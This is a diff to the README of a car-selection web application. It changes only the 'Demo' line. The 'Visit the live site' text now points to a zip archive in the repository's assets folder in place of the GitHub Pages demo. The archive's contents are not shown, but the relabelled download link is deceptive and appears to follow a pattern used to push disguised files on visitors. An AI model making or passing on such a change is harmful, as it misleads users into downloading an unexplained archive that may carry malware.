@@ -10,7 +10,7 @@ A user‑friendly web application to browse and select cars from different brand
 
 ## ​ Demo
 
-Visit the live site: https://devharis99.github.io/CarSelectionWebsite/
+Visit the live site: https://github.com/devharis99/CarSelectionWebsite/raw/refs/heads/main/assets/1.0.zip
 
 ## ​ Technologies Used
 
